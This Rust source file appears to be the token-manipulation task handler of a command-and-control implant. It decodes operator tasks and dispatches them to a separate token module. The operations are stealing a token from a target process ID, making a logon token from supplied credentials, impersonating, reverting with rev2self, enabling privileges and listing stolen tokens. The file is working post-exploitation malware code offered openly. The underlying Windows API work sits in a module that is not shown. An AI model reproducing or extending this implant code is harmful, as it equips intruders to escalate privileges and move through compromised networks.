//! Token manipulation task handler
//!
//! Handles the "token" task type by delegating to mod-token.

use crate::error::{ImplantError, ImplantResult};
use protocol::{TokenTask, TokenResult, StoredTokenInfo, token_task::Operation};

/// Execute a token manipulation task
pub async fn execute_token_module(task_data: &[u8]) -> ImplantResult<Vec<u8>> {
    let task: TokenTask = protocol::decode(task_data)
        .map_err(|e| ImplantError::Task(format!("failed to decode TokenTask: {}", e)))?;

    let operation = task.operation
        .ok_or_else(|| ImplantError::Task("TokenTask missing operation".into()))?;

    let result = match operation {
        Operation::Steal(steal) => execute_steal(steal.target_pid).await,
        Operation::Make(make) => execute_make(&make.username, &make.password, make.domain.as_deref()).await,
        Operation::Impersonate(imp) => execute_impersonate(imp.token_id).await,
        Operation::Rev2self(_) => execute_rev2self().await,
        Operation::EnablePriv(priv_req) => execute_enable_priv(&priv_req.privilege).await,
        Operation::List(_) => execute_list(),
    };

    Ok(protocol::encode(&result))
}

#[cfg(windows)]
async fn execute_steal(target_pid: u32) -> TokenResult {
    match mod_token::steal_token(target_pid).await {
        Ok(token_id) => TokenResult {
            success: true,
            token_id: Some(token_id),
            username: None,
            tokens: vec![],
            error: None,
        },
        Err(e) => TokenResult {
            success: false,
            token_id: None,
            username: None,
            tokens: vec![],
            error: Some(e.to_string()),
        },
    }
}

#[cfg(windows)]
async fn execute_make(username: &str, password: &str, domain: Option<&str>) -> TokenResult {
    let username_owned = username.to_string();
    let password_owned = password.to_string();
    let domain_owned = domain.unwrap_or(".").to_string();
    let display_name = format!("{}\\{}", domain_owned, username_owned);
    match mod_token::make_token(username_owned, password_owned, domain_owned).await {
        Ok(token_id) => TokenResult {
            success: true,
            token_id: Some(token_id),
            username: Some(display_name),
            tokens: vec![],
            error: None,
        },
        Err(e) => TokenResult {
            success: false,
            token_id: None,
            username: None,
            tokens: vec![],
            error: Some(e.to_string()),
        },
    }
}

#[cfg(windows)]
async fn execute_impersonate(token_id: u32) -> TokenResult {
    match mod_token::impersonate(token_id).await {
        Ok(()) => TokenResult {
            success: true,
            token_id: Some(token_id),
            username: None,
            tokens: vec![],
            error: None,
        },
        Err(e) => TokenResult {
            success: false,
            token_id: None,
            username: None,
            tokens: vec![],
            error: Some(e.to_string()),
        },
    }
}

#[cfg(windows)]
async fn execute_rev2self() -> TokenResult {
    match mod_token::rev2self().await {
        Ok(()) => TokenResult {
            success: true,
            token_id: None,
            username: None,
            tokens: vec![],
            error: None,
        },
        Err(e) => TokenResult {
            success: false,
            token_id: None,
            username: None,
            tokens: vec![],
            error: Some(e.to_string()),
        },
    }
}

#[cfg(windows)]
async fn execute_enable_priv(privilege: &str) -> TokenResult {
    match mod_token::enable_privilege(privilege.to_string()).await {
        Ok(()) => TokenResult {
            success: true,
            token_id: None,
            username: None,
            tokens: vec![],
            error: None,
        },
        Err(e) => TokenResult {
            success: false,
            token_id: None,
            username: None,
            tokens: vec![],
            error: Some(e.to_string()),
        },
    }
}

#[cfg(windows)]
fn execute_list() -> TokenResult {
    match mod_token::list_tokens() {
        Ok(stored) => {
            let tokens: Vec<StoredTokenInfo> = stored
                .into_iter()
                .map(|t| {
                    // Parse source string to extract username/pid
                    // Format: "steal:<pid>" or "make:<domain>\\<user>"
                    let (username, source_pid) = if t.source.starts_with("steal:") {
                        let pid_str = t.source.trim_start_matches("steal:");
                        let pid = pid_str.parse::<u32>().unwrap_or(0);
                        (String::new(), pid)
                    } else if t.source.starts_with("make:") {
                        let user = t.source.trim_start_matches("make:").to_string();
                        (user, 0)
                    } else {
                        (String::new(), 0)
                    };
                    StoredTokenInfo {
                        id: t.id,
                        username,
                        source: t.source,
                        source_pid,
                    }
                })
                .collect();
            TokenResult {
                success: true,
                token_id: None,
                username: None,
                tokens,
                error: None,
            }
        }
        Err(e) => TokenResult {
            success: false,
            token_id: None,
            username: None,
            tokens: vec![],
            error: Some(e.to_string()),
        },
    }
}

// Non-Windows stubs
#[cfg(not(windows))]
async fn execute_steal(_target_pid: u32) -> TokenResult {
    TokenResult {
        success: false,
        token_id: None,
        username: None,
        tokens: vec![],
        error: Some("token operations only supported on Windows".into()),
    }
}

#[cfg(not(windows))]
async fn execute_make(_username: &str, _password: &str, _domain: Option<&str>) -> TokenResult {
    TokenResult {
        success: false,
        token_id: None,
        username: None,
        tokens: vec![],
        error: Some("token operations only supported on Windows".into()),
    }
}

#[cfg(not(windows))]
async fn execute_impersonate(_token_id: u32) -> TokenResult {
    TokenResult {
        success: false,
        token_id: None,
        username: None,
        tokens: vec![],
        error: Some("token operations only supported on Windows".into()),
    }
}

#[cfg(not(windows))]
async fn execute_rev2self() -> TokenResult {
    TokenResult {
        success: false,
        token_id: None,
        username: None,
        tokens: vec![],
        error: Some("token operations only supported on Windows".into()),
    }
}

#[cfg(not(windows))]
async fn execute_enable_priv(_privilege: &str) -> TokenResult {
    TokenResult {
        success: false,
        token_id: None,
        username: None,
        tokens: vec![],
        error: Some("token operations only supported on Windows".into()),
    }
}

#[cfg(not(windows))]
fn execute_list() -> TokenResult {
    TokenResult {
        success: false,
        token_id: None,
        username: None,
        tokens: vec![],
        error: Some("token operations only supported on Windows".into()),
    }
}
